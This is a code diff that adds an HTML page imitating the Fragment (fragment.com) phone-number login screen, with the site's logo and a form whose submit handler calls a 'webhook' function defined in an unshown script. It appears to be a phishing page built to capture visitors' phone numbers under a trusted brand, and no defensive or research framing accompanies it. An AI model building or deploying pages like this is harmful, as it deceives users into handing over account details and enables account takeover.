@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./login/login.css">
+    <script src="./index.js"></script>
+    <title>Fragment</title>
+</head>
+
+<body>
+    <nav><a href="https://fragment.com/">
+            <img class="logo" src="./Screenshot 2024-01-31 230801.png" alt=""></a>
+    </nav>
+    <div class="main">
+        <div class="card login card1">
+            <img src="./mobile.png" class="cardimg0" alt="">
+            <span class="cardtext1">Your phone number</span>
+            <span class="cardtext2">Please confirm your country code and enter your phone number. </span>
+            <form onsubmit='webhook();return false;'>
+                <div class="inputs">
+                    <input class="input1 input" type="number" value="+" placeholder="+" id='message'>
+                    <input class="input2 input" type="number" id='message1'>
+
+                </div>
+
+                    <button class="btn btn-primary btn-block" value='Send'>Login with your phone number</button>
+
+
+            </form>
+        </div>
+
+
+    </div>
+
+</body>
+
+</html>
